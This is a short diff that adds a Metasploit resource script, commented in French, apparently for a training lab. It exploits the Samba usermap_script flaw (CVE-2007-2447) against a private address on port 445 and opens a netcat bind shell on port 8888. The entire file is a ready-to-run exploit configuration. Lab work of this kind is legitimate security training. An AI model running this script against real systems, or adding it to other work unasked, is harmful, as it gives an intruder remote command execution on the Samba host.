@@ -1,0 +1,10 @@
+# samba_bind.rc — CVE-2007-2447 (bind shell alternatif)
+# RHOSTS doit etre adapte a votre reseau
+# Utiliser lab_j2.sh pour une execution automatisee
+use exploit/multi/samba/usermap_script
+set RHOSTS 172.18.0.4
+set RPORT 445
+set PAYLOAD cmd/unix/bind_netcat
+set LPORT 8888
+set VERBOSE true
+run
